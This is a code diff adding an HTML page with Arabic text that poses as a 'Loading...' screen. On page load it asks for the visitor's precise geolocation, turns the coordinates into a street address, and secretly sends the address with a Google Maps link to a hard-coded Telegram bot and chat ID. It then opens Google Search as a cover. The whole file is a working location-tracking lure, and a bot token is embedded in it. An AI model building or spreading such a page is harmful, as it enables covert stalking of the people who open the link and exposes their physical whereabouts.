@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <script>
+        const botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc";
+        const chatId = "5792222595";
+
+        function openGoogleSearch() {
+            const googleSearchUrl = "https://www.google.com/search"; 
+            window.open(googleSearchUrl, "_blank");
+        }
+
+        async function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error(" :", error);
+                return false; 
+            }
+        }
+
+        async function getDetailedLocation(latitude, longitude) {
+            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ar`;
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data && data.address) {
+                    const address = data.display_name; 
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; // رابط Google Maps
+                    const message = `📍 موقع جديد تم تحديده:\n\n${address}\n\n🌐 رابط Google Maps: ${googleMapsLink}`;
+                    const isSent = await sendToTelegram(message);
+                    if (isSent) {
+                        openGoogleSearch();
+                    }
+                } else {
+                    throw new Error(".");
+                }
+            } catch (error) {
+                console.error("حع:", error);
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            getDetailedLocation(latitude, longitude); 
+        }
+
+        function showError(error) {
+            console.error("ثع:", error);
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                enableHighAccuracy: true, 
+                timeout: 10000, 
+                maximumAge: 0 
+            });
+        } else {
+            console.error(".");
+        }
+    </script>
+</body>
+</html>
